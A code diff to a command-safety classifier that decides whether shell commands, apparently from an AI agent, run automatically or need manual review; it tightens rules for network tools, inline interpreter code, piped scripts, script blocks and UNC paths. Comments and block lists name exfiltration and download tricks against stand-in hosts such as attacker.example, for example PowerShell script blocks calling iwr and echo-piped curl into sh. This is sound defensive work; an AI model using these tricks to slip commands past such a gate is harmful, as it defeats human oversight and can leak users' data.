@@ -47,9 +47,16 @@ const DANGER_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
  * `'(…)'` stay safe (`"$(…)"` is already caught by the `$(` pattern above). A
  * network-device regex filter such as `| include (a|b)` now asks instead of
  * auto-running — the safe direction.
+ *
+ * Braces count too. A PowerShell script block `{ … }` bound to a parameter that
+ * takes pipeline input runs once per piped item, so
+ * `echo 1 | Get-Content -Path {iwr https://attacker.example/}` runs `iwr` behind
+ * two whitelisted commands; a POSIX brace group `{ cmd; }` runs its body too.
+ * Quoted braces stay safe (`awk '{print $1}'`); an unquoted `${HOME}` or
+ * `find … -exec … {} +` now asks — again the safe direction.
  */
 function hasUnquotedGrouping(line: string): boolean {
-    return /[()]/.test(line.replace(/'[^']*'|"[^"]*"/g, ''));
+    return /[(){}]/.test(line.replace(/'[^']*'|"[^"]*"/g, ''));
 }
 
 // ── Dangerous flag rules per command ────────────────────────────────────────
@@ -64,6 +71,120 @@ interface FlagRule {
 /** The words of a segment after its base command that are not flags (`-x`, `--x`, `/x`). */
 function operands(segment: string): string[] {
     return segment.trim().split(/\s+/).slice(1).filter((t) => !/^[-/]/.test(t));
+}
+
+/** The words of a segment after its base command. */
+function argWords(segment: string): string[] {
+    return segment.trim().split(/\s+/).slice(1);
+}
+
+// The read/WRITE network tools below are judged by allow-listing their read
+// forms rather than deny-listing write verbs. A deny list kept missing spellings
+// the tools accept: iproute2 takes any prefix of a command (`ip r de default`,
+// `ip addr fl dev eth0`), `ifconfig eth0 10.0.0.5` changes the address with no
+// verb at all, Windows `route ADD` / `route -f` slipped a case-sensitive regex.
+
+// `ip` options that take a value: `-n <netns>`, `-f <family>`, `-l <loops>`.
+const IP_VALUE_OPTIONS = new Set(['-n', '-netns', '-f', '-family', '-l', '-loops', '-rc', '-rcvbuf']);
+// COMMAND words that can only mean a read. iproute2 matches any prefix and, for
+// some objects, tries write verbs first, so a bare `s` / `a` / `l` may mean
+// `set` / `add` / … and is left out on purpose.
+const IP_READ_COMMANDS = new Set(['show', 'sho', 'sh', 'list', 'lis', 'li', 'lst', 'ls', 'get', 'ge']);
+
+/** `ip [OPTIONS] [OBJECT [COMMAND …]]` where COMMAND, if given, is a read. */
+function isReadOnlyIp(segment: string): boolean {
+    const words = argWords(segment);
+    let i = 0;
+    while (i < words.length && words[i].startsWith('-')) {
+        if (IP_VALUE_OPTIONS.has(words[i].toLowerCase())) i++;
+        i++;
+    }
+    // Options only, or `OBJECT` alone (`ip a`, `ip -s link`) — both print.
+    if (i + 1 >= words.length) return true;
+    return IP_READ_COMMANDS.has(words[i + 1].toLowerCase());
+}
+
+/**
+ * `ifconfig`, `ifconfig -a`, `ifconfig eth0`: at most one operand (the interface)
+ * and only listing flags. A second word is an address, `up`, `delete`, `destroy`;
+ * a flag such as `-promisc` / `-arp` after the interface also reconfigures it.
+ */
+function isReadOnlyIfconfig(segment: string): boolean {
+    const words = argWords(segment);
+    const flags = words.filter((w) => w.startsWith('-'));
+    return words.length - flags.length <= 1 && flags.every((f) => /^-[asvludmLC]+$/.test(f));
+}
+
+/**
+ * `route`, `route -n`, `route -ee`, `route -A inet6` (Linux), `route print`
+ * (Windows), `route get <dst>` / `route show` (BSD). A Windows `/x` switch is
+ * treated like a flag.
+ */
+function isReadOnlyRoute(segment: string): boolean {
+    const words = argWords(segment);
+    let i = 0;
+    while (i < words.length && /^[-/]/.test(words[i])) {
+        const f = words[i];
+        if (f === '-A' || f === '--family') {
+            i += 2;
+            continue;
+        }
+        if (!/^-(?:[nevC46]+|-(?:numeric|extend|verbose|cache))$/.test(f)) return false;
+        i++;
+    }
+    return i >= words.length || /^(?:print|get|show)$/i.test(words[i]);
+}
+
+/**
+ * `arp`, `arp -a [host]`, `arp -n`, `arp -e`, `arp -g`, `arp -v`, and the value
+ * options `-N <if>` (Windows), `-i <if>`, `-H`/`-t <type>`. Anything else —
+ * `-d`, `-s`, `-f`, `--delete`, `--set`, `--file` — writes the cache. Operands
+ * (a host, an interface) are reads either way.
+ */
+function isReadOnlyArp(segment: string): boolean {
+    return argWords(segment)
+        .filter((w) => /^[-/]/.test(w))
+        .every(
+            (f) =>
+                /^[-/][aAgGnNevViHt]+$/.test(f) ||
+                /^--(?:all|numeric|verbose|device|hw-type)(?:=.*)?$/.test(f),
+        );
+}
+
+// Verbs that change netsh state. netsh accepts any unambiguous prefix of a
+// command, so `netsh int ip se addr …` is `set` and `netsh int ip a addr …` is
+// `add`; every prefix of these counts.
+const NETSH_WRITE_VERBS = [
+    'set', 'add', 'delete', 'reset', 'export', 'import', 'exec', 'install', 'uninstall',
+    'flush', 'renew', 'connect', 'disconnect', 'reconnect', 'start', 'stop',
+];
+
+function netshHasWriteVerb(segment: string): boolean {
+    return argWords(segment).some((w) => {
+        const t = w.toLowerCase();
+        return /^[a-z]+$/.test(t) && NETSH_WRITE_VERBS.some((v) => v.startsWith(t));
+    });
+}
+
+/**
+ * Whether `date` is given an operand that sets the clock. GNU `date MMDDhhmm…`
+ * and BSD `date [[[[cc]yy]mm]dd]HH]MM` set it from a bare operand; only a
+ * `+FORMAT` operand prints. Quoted text is joined into one word first so
+ * `date +"%Y %m"` and `date -d "next monday"` read as one operand each.
+ */
+function dateSetsClock(segment: string): boolean {
+    const joined = segment.replace(/(["'])(.*?)\1/g, (_m, _q, body: string) => body.replace(/\s/g, '_'));
+    const words = argWords(joined);
+    for (let i = 0; i < words.length; i++) {
+        const w = words[i];
+        if (/^(?:-[drfv]|--(?:date|reference|file))$/.test(w)) {
+            i++; // the option's value
+            continue;
+        }
+        if (w.startsWith('-')) continue;
+        if (!w.startsWith('+')) return true;
+    }
+    return false;
 }
 
 const DANGEROUS_FLAGS: Record<string, FlagRule[]> = {
@@ -96,32 +217,37 @@ const DANGEROUS_FLAGS: Record<string, FlagRule[]> = {
     ],
     // Read/WRITE network + kernel tools: whitelisted for their read-only queries
     // (`ip addr show`, `netsh interface show`, `sysctl -a`), but their write
-    // subcommands reconfigure the box / cut the management link and must never
-    // auto-execute. Reject the write verbs; anything else stays fast-path safe.
+    // forms reconfigure the box / cut the management link and must never
+    // auto-execute. `ip` / `ifconfig` / `route` / `arp` allow only their read
+    // forms (see isReadOnlyIp and its neighbours); the others reject write forms.
     ip: [
-        { patterns: [/(?:^|\s)(?:add|del|delete|change|replace|flush|set|append|prepend)\b/], reason: 'ip write subcommand' },
         // `ip netns exec <ns> <cmd>` runs any program; `-b`/`-batch` runs commands from a file.
         { patterns: [/(?:^|\s)(?:exec|-b|-batch|-force)\b/], reason: 'ip runs another command' },
+        { patterns: [], check: (seg) => !isReadOnlyIp(seg), reason: 'ip command other than show/list/get' },
     ],
     ifconfig: [
-        // A bare query (`ifconfig`, `ifconfig eth0`) is safe; any config verb is not.
-        { patterns: [/(?:^|\s)(?:up|down|add|del|netmask|mtu|broadcast|promisc|-promisc|arp|-arp|hw)\b/], reason: 'ifconfig interface reconfiguration' },
+        { patterns: [], check: (seg) => !isReadOnlyIfconfig(seg), reason: 'ifconfig interface reconfiguration' },
     ],
     route: [
-        { patterns: [/(?:^|\s)(?:add|del|delete|change|flush)\b/], reason: 'route table modification' },
+        { patterns: [], check: (seg) => !isReadOnlyRoute(seg), reason: 'route command other than print/get/show' },
     ],
     arp: [
-        { patterns: [/(?:^|\s)-[ds]\b/], reason: 'arp cache modification (-d/-s)' },
+        { patterns: [], check: (seg) => !isReadOnlyArp(seg), reason: 'arp cache modification' },
     ],
     netsh: [
-        { patterns: [/(?:^|\s)(?:set|add|delete|reset)\b/], reason: 'netsh configuration change' },
+        { patterns: [/(?:^|\s)[-/][fr]\b/i], reason: 'netsh runs a script (-f) or targets another machine (-r)' },
         // `netsh wlan export profile key=clear folder=…` writes every saved Wi-Fi
-        // password to disk; `exec` runs a script; the rest change state.
-        { patterns: [/(?:^|\s)(?:export|import|exec|install|uninstall|flush|renew|connect|disconnect|start|stop)\b/i], reason: 'netsh state change or file write' },
+        // password to disk; `exec` runs a script; the rest change state. Matched
+        // as prefixes, since netsh accepts abbreviated commands.
+        { patterns: [], check: netshHasWriteVerb, reason: 'netsh configuration change, state change or file write' },
+        // Only a read auto-runs. This also catches what a verb list cannot name.
+        { patterns: [], check: (seg) => !/(?:^|\s)(?:show|sho|sh|dump|help|\?)(?:\s|$)/i.test(seg), reason: 'netsh without a show / dump / help verb' },
     ],
     sysctl: [
         // `sysctl -w key=val` or `sysctl key=val` writes kernel parameters.
         { patterns: [/(?:^|\s)-w\b/, /=/], reason: 'sysctl kernel parameter write' },
+        // `-p` / `-f` / `--system` / `--load` apply every setting in a file.
+        { patterns: [/(?:^|\s)-[A-Za-z]*[pf]/, /(?:^|\s)--(?:load|system|write)\b/], reason: 'sysctl loads settings from a file' },
     ],
     dmesg: [
         { patterns: [/(?:^|\s)(?:-c|-C|--clear|--read-clear)\b/], reason: 'dmesg ring-buffer clear' },
@@ -149,7 +275,7 @@ const DANGEROUS_FLAGS: Record<string, FlagRule[]> = {
         { patterns: [/(?:^|\s)(?:-C|--compile)\b/], reason: 'file writes a compiled magic file (-C)' },
     ],
     date: [
-        { patterns: [/(?:^|\s)(?:-s|--set)\b/], reason: 'date sets the system clock' },
+        { patterns: [/(?:^|\s)(?:-s|--set)\b/], check: dateSetsClock, reason: 'date sets the system clock' },
     ],
     hostname: [
         // A bare `hostname` / `hostname -I` prints; a name argument or a file sets it.
@@ -170,10 +296,22 @@ const DANGEROUS_FLAGS: Record<string, FlagRule[]> = {
         // FortiOS: `diagnose sys session clear` drops every session, `diagnose sys kill` …
         { patterns: [/(?:^|\s)(?:clear|kill|killall|reset|reset-\S+|restart|reboot|shutdown|flush|delete|del|purge|format|erase|update|upload|disconnect|stop|start)\b/i], reason: 'diagnose state change' },
     ],
-    // Lookups sent to a server the command line picks are an exfiltration channel
-    // (`dig @203.0.113.5 <data>.x`). Lookups through the configured resolver still
-    // auto-run: a name such as `<data>.attacker.example` can still leak through
-    // DNS, which no flag rule can close without blocking these tools outright.
+};
+
+// ── Egress options ──────────────────────────────────────────────────────────
+//
+// Read tools that become an exfiltration channel with one option or subcommand.
+// These are network-egress floor rules (see networkEgressDanger), so they stop
+// the command on every strategy; they used to sit only in DANGEROUS_FLAGS, which
+// the whitelist path alone consults, so in `hybrid`/`ai` the same command went
+// to the AI verdict instead. They are merged into DANGEROUS_FLAGS below as well,
+// so classifyCommand on its own still rejects them.
+//
+// Lookups sent to a server the command line picks are an exfiltration channel
+// (`dig @203.0.113.5 <data>.x`). Lookups through the configured resolver still
+// auto-run: a name such as `<data>.attacker.example` can still leak through
+// DNS, which no flag rule can close without blocking these tools outright.
+const EGRESS_OPTION_RULES: Record<string, FlagRule[]> = {
     dig: [
         { patterns: [/(?:^|\s)@\S/], reason: 'dig asks a server named on the command line (@server)' },
     ],
@@ -185,6 +323,10 @@ const DANGEROUS_FLAGS: Record<string, FlagRule[]> = {
         // `host [-t type] NAME SERVER`; `-t`/`-c`/`-W`/`-N`/`-R`/`-m` take a value.
         { patterns: [], check: (seg) => operands(seg.replace(/\s-[tcWNRm]\s+\S+/g, '')).length >= 2, reason: 'host asks a server named on the command line' },
     ],
+    'resolve-dnsname': [
+        // `-Server` (PowerShell takes any unambiguous prefix, `-se`).
+        { patterns: [/(?:^|\s)-se\w*/i], reason: 'Resolve-DnsName asks a server named on the command line (-Server)' },
+    ],
     ping: [
         // `ping -p <hex>` (Linux) fills the payload with chosen bytes.
         { patterns: [/(?:^|\s)-[A-Za-z]*p/], reason: 'ping with a chosen payload (-p)' },
@@ -192,7 +334,21 @@ const DANGEROUS_FLAGS: Record<string, FlagRule[]> = {
     ping6: [
         { patterns: [/(?:^|\s)-[A-Za-z]*p/], reason: 'ping with a chosen payload (-p)' },
     ],
+    // `git ls-remote https://attacker.example/?d=…` — any URL, any data.
+    git: [
+        {
+            patterns: [/(?:^|\s)(?:ls-remote|fetch|clone|pull|push|request-pull|send-email|archive\s+--remote|remote\s+(?:update|show|prune)|submodule\s+(?:update|sync|add))\b/],
+            reason: 'git contacts a remote repository',
+        },
+    ],
+    openssl: [
+        { patterns: [/(?:^|\s)(?:s_client|s_time|ocsp)\b/], reason: 'openssl connects to a server' },
+    ],
 };
+
+for (const [cmd, rules] of Object.entries(EGRESS_OPTION_RULES)) {
+    DANGEROUS_FLAGS[cmd] = [...(DANGEROUS_FLAGS[cmd] ?? []), ...rules];
+}
 
 // ── Prefix wrappers ─────────────────────────────────────────────────────────
 //
@@ -273,7 +429,90 @@ const NETWORK_EGRESS_COMMANDS: Set<string> = new Set([
     // Windows living-off-the-land downloaders
     'bitsadmin', 'certutil', 'start-bitstransfer',
     'invoke-webrequest', 'iwr', 'invoke-restmethod', 'irm',
+    // `(New-Object Net.WebClient).DownloadString(…)` — the brackets alone trip the
+    // grouping floor, but not inside `pwsh -c "…"`, where they are quoted.
+    'new-object',
+    // Fetch and run a remote file: `mshta http://…`, `regsvr32 /i:http://… scrobj.dll`,
+    // `msiexec /i http://…`
+    'mshta', 'regsvr32', 'msiexec',
+    // Mail, TCP probes, and more transfer clients
+    'send-mailmessage', 'test-netconnection', 'tnc',
+    'smbclient', 'rclone', 'aria2c', 'lftp',
 ]);
+
+// ── Inline code ─────────────────────────────────────────────────────────────
+//
+// Interpreters handed program text on the command line. That text is code, not
+// words, so the command-position walk cannot look inside it:
+// `python3 -c "__import__('urllib.request').request.urlopen('http://x/?d=…')"`
+// keeps its brackets inside quotes, and `pwsh -EncodedCommand <base64>` hides
+// everything. Each entry tests one argument word for the inline-code option.
+const INLINE_CODE_OPTIONS: Record<string, (word: string) => boolean> = {
+    python: (w) => /^-[A-Za-z]*c$/.test(w),
+    node: (w) => /^-[A-Za-z]*[ep]$/.test(w) || /^--(?:eval|print)(?:=|$)/.test(w),
+    perl: (w) => /^-[A-Za-z]*[eE]$/.test(w),
+    ruby: (w) => /^-[A-Za-z]*e$/.test(w),
+    php: (w) => /^-[A-Za-z]*r$/.test(w),
+    lua: (w) => /^-[A-Za-z]*e$/.test(w),
+    osascript: (w) => w === '-e',
+    // `-Command` / `-EncodedCommand` and any prefix PowerShell accepts (`-c`,
+    // `-enc`, `-ec`), with `-` or `/`; `-` alone reads the program from stdin.
+    pwsh: (w) => {
+        const m = /^[-/]([A-Za-z]*)$/.exec(w);
+        if (!m) return false;
+        const p = m[1].toLowerCase();
+        return p === '' || p === 'ec' || 'command'.startsWith(p) || 'encodedcommand'.startsWith(p);
+    },
+};
+
+// Shells and interpreters that read a program from stdin when piped into:
+// `echo 'curl https://attacker.example/' | sh`. The program is data on the left
+// of the pipe, out of the walk's reach.
+const STDIN_INTERPRETERS: Set<string> = new Set([
+    'sh', 'bash', 'zsh', 'dash', 'ksh', 'fish', 'csh', 'tcsh', 'ash',
+    'pwsh', 'powershell', 'cmd', 'python', 'node', 'perl', 'ruby', 'php', 'lua',
+]);
+
+/**
+ * Whether an interpreter's own options (the flags before its script name or
+ * first operand) include its inline-code option. Arguments after the script
+ * belong to the script: `python3 app.py -c settings.ini` is not inline code.
+ */
+function hasInlineCode(family: string, args: string[]): boolean {
+    const isInline = INLINE_CODE_OPTIONS[family];
+    if (!isInline) return false;
+    // Only PowerShell takes `/Switch`; elsewhere a leading `/` is a script path.
+    const isOption = family === 'pwsh' ? /^[-/]/ : /^-/;
+    for (const w of args) {
+        if (!isOption.test(w)) return false;
+        if (isInline(w)) return true;
+    }
+    return false;
+}
+
+/** `python3.11` → `python`, `powershell` → `pwsh`, so one entry covers each family. */
+function interpreterFamily(name: string): string {
+    if (name === 'powershell') return 'pwsh';
+    return name.replace(/\d+(?:\.\d+)*$/, '');
+}
+
+/**
+ * Whether a word names a path on another machine: `\\host\share\x`, `//host/x`,
+ * `\\?\UNC\host\share`, also behind a parameter (`-Path:\\host\x`,
+ * `--file=\\host\x`) or a provider prefix (`FileSystem::\\host\x`). Opening one
+ * makes an SMB connection (WebDAV for `\\host@SSL\…`) from this PC, which sends
+ * the user's NTLM hash and leaks whatever is spelled into the host name — so
+ * whitelisted readers such as `Get-Content`, `dir` and `type` become egress
+ * tools. The local device namespaces `\\?\C:\…` and `\\.\…` and WSL's local
+ * `\\wsl$\…` / `\\wsl.localhost\…` are not remote.
+ */
+function namesRemotePath(word: string): boolean {
+    const t = stripTokenQuotes(word.replace(/^-{1,2}[\w-]+[:=]/, '').replace(/^.*::/, ''));
+    if (/^\\\\\?\\UNC\\/i.test(t)) return true;
+    if (/^\\\\[?.]\\/.test(t)) return false;
+    if (/^\\\\wsl(?:\$|\.localhost)\\/i.test(t)) return false;
+    return /^(?:\\\\|\/\/)[^\\/\s]/.test(t);
+}
 
 /**
  * Strip a segment's base command down to a comparable name: drop any directory
@@ -422,7 +661,10 @@ export function structuralDanger(command: string): StructuralDanger {
             }
         }
         if (hasUnquotedGrouping(line)) {
-            return { danger: true, reason: 'Contains a grouping bracket ( ) that can run another command' };
+            return {
+                danger: true,
+                reason: 'Contains a grouping bracket ( ) or script block { } that can run another command',
+            };
         }
     }
     return { danger: false, reason: '' };
@@ -442,6 +684,12 @@ export function structuralDanger(command: string): StructuralDanger {
  * within each segment it scans every *command position* rather than only the
  * base — see {@link commandPositions} for why that distinction carries the whole
  * fix.
+ *
+ * Besides the egress tools themselves it stops, on every strategy: a word that
+ * names another machine ({@link namesRemotePath}); an interpreter given inline
+ * code ({@link INLINE_CODE_OPTIONS}) or piped a program
+ * ({@link STDIN_INTERPRETERS}); and the egress options of read tools
+ * ({@link EGRESS_OPTION_RULES}, e.g. `dig @server`).
  */
 export function networkEgressDanger(command: string): StructuralDanger {
     const lines = command
@@ -449,7 +697,18 @@ export function networkEgressDanger(command: string): StructuralDanger {
         .map((l) => l.trim())
         .filter((l) => l.length > 0);
     for (const line of lines) {
-        for (const segment of line.split('|')) {
+        const segments = line.split('|');
+        for (let s = 0; s < segments.length; s++) {
+            const segment = segments[s];
+            const words = segment.trim().split(/\s+/).filter(Boolean);
+
+            if (words.some(namesRemotePath)) {
+                return {
+                    danger: true,
+                    reason: 'A UNC path (\\\\host\\share) connects to another machine — needs manual review',
+                };
+            }
+
             for (const tok of commandPositions(segment)) {
                 const name = normalizeBaseCommand(tok);
                 if (NETWORK_EGRESS_COMMANDS.has(name)) {
@@ -457,6 +716,31 @@ export function networkEgressDanger(command: string): StructuralDanger {
                         danger: true,
                         reason: `"${name}" can send data off this host — needs manual review`,
                     };
+                }
+
+                // The rest of the segment from this command on: its own arguments.
+                const at = words.findIndex((w) => normalizeBaseCommand(stripTokenQuotes(w)) === name);
+                const own = at >= 0 ? words.slice(at) : [tok];
+                const family = interpreterFamily(name);
+
+                if (hasInlineCode(family, own.slice(1))) {
+                    return {
+                        danger: true,
+                        reason: `"${name}" runs inline code that can reach the network — needs manual review`,
+                    };
+                }
+                if (s > 0 && at === 0 && STDIN_INTERPRETERS.has(family)) {
+                    return {
+                        danger: true,
+                        reason: `"${name}" runs a program piped into it — needs manual review`,
+                    };
+                }
+
+                const rules = EGRESS_OPTION_RULES[name];
+                const ownLine = own.join(' ');
+                const hit = rules?.find((r) => r.patterns.some((p) => p.test(ownLine)) || r.check?.(ownLine));
+                if (hit) {
+                    return { danger: true, reason: `${hit.reason} — needs manual review` };
                 }
             }
         }
